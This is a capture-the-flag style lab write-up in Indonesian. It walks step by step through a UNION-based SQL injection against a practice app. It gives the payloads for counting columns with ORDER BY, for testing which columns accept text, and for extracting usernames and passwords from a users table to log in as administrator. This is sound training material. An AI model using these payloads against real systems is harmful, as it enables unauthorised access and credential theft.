# SQL Injection Lab – Extracting Data from Users Table

## Lab Description

![image](https://user-images.githubusercontent.com/67383098/234058543-7b45e24b-1e6a-4a3e-b65e-03687d4c983b.png)

---

## Solution

> Database memiliki tabel bernama **users** dengan kolom **username** dan **password**.

### 1. Menentukan Jumlah Kolom

Dengan melakukan uji `ORDER BY`, terlihat bahwa `ORDER BY 3` menimbulkan error.
Artinya query hanya mengambil **2 kolom**.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://user-images.githubusercontent.com/67383098/234059573-93d0b8a0-ff4b-4e97-b31f-1403e5f81e2c.png)

---

### 2. Menentukan Kolom yang Mendukung Data Teks

Untuk melanjutkan eksploitasi, perlu diketahui kolom mana yang dapat menampilkan data teks.

**Uji pada kolom pertama:**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'A',NULL --
```

![image](https://user-images.githubusercontent.com/67383098/234060309-9038d2e6-2d7d-47c4-a380-36eadbeec012.png)

Hasil: kolom pertama dapat menampilkan data teks.

**Uji pada kolom kedua:**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'A' --
```

![image](https://user-images.githubusercontent.com/67383098/234060453-c86da807-fc07-45d0-bc78-e290bebecaba.png)

Hasil: kolom kedua juga dapat menampilkan data teks.

---

### 3. Mengekstrak Username dan Password

Karena kedua kolom mendukung data teks, kita dapat langsung mengambil data dari tabel **users** tanpa perlu menggunakan fungsi `CONCAT()`.

Payload:

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' 
UNION SELECT username,password FROM users --
```

![image](https://user-images.githubusercontent.com/67383098/234061618-7df6319c-199d-48f5-bf98-234684bff6e6.png)

![image](https://user-images.githubusercontent.com/67383098/234061661-b0778724-17d3-4786-b67a-ad53930b2a46.png)

![image](https://user-images.githubusercontent.com/67383098/234061490-8a148bb3-9d40-4051-b378-6fdf807161e0.png)

Hasil: seluruh **username** dan **password** pada tabel users berhasil diekstraksi.

---

### 4. Login sebagai Administrator

Setelah mendapatkan kredensial, kita dapat login sebagai user administrator.

![image](https://user-images.githubusercontent.com/67383098/234062933-c91f5ab3-85aa-4593-b337-0b49f47d6cec.png)
